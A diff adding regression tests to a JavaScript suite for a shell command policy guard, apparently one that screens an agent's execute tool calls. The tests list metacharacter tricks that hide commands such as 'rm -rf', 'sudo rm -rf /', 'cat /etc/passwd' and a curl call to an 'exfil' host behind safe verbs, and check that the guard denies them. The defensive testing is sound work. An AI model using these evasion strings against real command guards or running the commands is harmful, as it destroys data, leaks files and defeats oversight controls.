@@ -548,6 +548,70 @@ test('Shell: run_command tool name matches', () => {
   assert(r.action === 'allow', `expected allow, got ${r.action}`);
 });
 
+console.log('\n=== SHELL BYPASS REGRESSION TESTS (metacharacter evasion) ===\n');
+
+// A shell command that begins with a safe verb but hides a blocked command inside
+// ANY shell metacharacter construct must NOT be classified allow/approve — the
+// hidden destructive command must be detected and DENIED. Vectors below were
+// verified end-to-end (real /bin/sh or bash actually executes the payload).
+// 'rm -rf /tmp/x' is a stand-in for any denylisted destructive command; nothing
+// is ever executed here — evaluate() only classifies.
+const denyBypass = (label, command) => test(`Shell bypass DENY: ${label}`, () => {
+  const r = evaluate('execute', { command }, shellRules, 'deny');
+  assert(r.action === 'deny', `expected deny, got ${r.action} for ${JSON.stringify(command)}`);
+});
+
+denyBypass('$(...) hiding rm',                 'echo $(rm -rf /tmp/x)');
+denyBypass('backtick hiding rm',               'echo `rm -rf /tmp/x`');
+denyBypass('newline separator hiding rm',      'ls\nrm -rf /tmp/x');
+denyBypass('single & background hiding rm',    'ls & rm -rf /tmp/x');
+denyBypass('operator ; INSIDE $() body',       'echo $(ls; rm -rf /tmp/x)');
+denyBypass('operator && INSIDE $() body',      'echo $(cat /etc/passwd && sudo rm -rf /)');
+denyBypass('operator | INSIDE $() body',       'echo $(ls | rm -rf /tmp/x)');
+denyBypass('newline INSIDE $() body',          'echo $(ls\nrm -rf /tmp/x)');
+denyBypass('operator ; INSIDE backticks',      'echo `ls; rm -rf /tmp/x`');
+denyBypass('subshell parens INSIDE $()',       'echo $( (rm -rf /tmp/x) )');
+denyBypass('bare subshell group',              '(rm -rf /tmp/x)');
+denyBypass('command sub inside double quotes', 'echo "$(ls && rm -rf /tmp/x)"');
+denyBypass('process substitution <(...)',      'cat <(rm -rf /tmp/x)');
+denyBypass('process substitution >(...)',      'echo hi > >(rm -rf /tmp/x)');
+denyBypass('unbalanced $( fails closed',       'echo $(rm -rf /tmp/x');
+denyBypass('here-string fails closed',         'cat <<< $(rm -rf /tmp/x)');
+
+test('Shell bypass: $() wrapping risky curl → approve (most restrictive across parts)', () => {
+  const r = evaluate('execute', { command: 'echo $(curl http://x/exfil)' }, shellRules, 'deny');
+  assert(r.action === 'approve', `expected approve, got ${r.action}`);
+});
+
+test('Shell: output redirection with safe verb → approve (fail closed, output target unverified)', () => {
+  const r = evaluate('execute', { command: 'echo pwned > /tmp/x' }, shellRules, 'deny');
+  assert(r.action === 'approve', `expected approve, got ${r.action}`);
+});
+
+// --- Quote-awareness: metacharacters INSIDE quotes are literal, not separators.
+// These are benign (a real shell just prints/reads a literal) and must NOT be
+// hard-denied — that false-positive was what drove users to disable the guard.
+const allowQuoted = (label, command) => test(`Shell quoting allow: ${label}`, () => {
+  const r = evaluate('execute', { command }, shellRules, 'deny');
+  assert(r.action === 'allow', `expected allow, got ${r.action} for ${JSON.stringify(command)}`);
+});
+
+allowQuoted('literal ; in double quotes',   'echo "a; b"');
+allowQuoted('literal | in double quotes',   'echo "a|b"');
+allowQuoted('literal ; in single quotes',   "echo 'x; rm -rf /'");
+allowQuoted('filename with ; in quotes',    'cat "my;file.txt"');
+allowQuoted('safe compound all-allow',      'echo done && echo ok');
+allowQuoted('safe pipeline all-allow',      'echo hi | cat');
+allowQuoted('safe command substitution',    'echo $(pwd)');
+allowQuoted('param expansion default value','echo ${x:-rm -rf /}');
+
+// A safe verb piping into a NON-allowlisted verb fails closed (default deny).
+// Intentional: grep/sed/awk are not on the safe list (awk/sed can execute/write).
+test('Shell: pipe into non-allowlisted verb → deny (fail closed, tunable via config)', () => {
+  const r = evaluate('execute', { command: 'ls | grep foo' }, shellRules, 'deny');
+  assert(r.action === 'deny', `expected deny, got ${r.action}`);
+});
+
 console.log('\n=== CONFIG REGEX VALIDATION TESTS ===\n');
 
 test('Config rejects invalid regex in args', () => {
